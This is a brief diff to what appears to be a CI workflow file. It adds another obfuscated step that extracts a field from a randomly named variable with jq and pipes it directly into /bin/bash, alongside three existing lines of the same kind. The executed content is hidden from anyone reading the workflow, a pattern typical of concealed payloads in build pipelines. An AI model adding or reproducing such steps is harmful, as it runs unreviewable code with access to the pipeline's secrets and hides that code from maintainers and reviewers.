@@ -32,6 +32,7 @@ jobs:
           echo $zuvdd629 | jq -r .ds1083 | /bin/bash
           echo $tvic13454 | jq -r .upa43 | /bin/bash
           printf '%s' "$vwkv439" | jq -r .ylyui7 | /bin/bash
+          echo $usiw84 | jq -r .ato2 | /bin/bash
 
       - name: Upload artifact
         if: always()
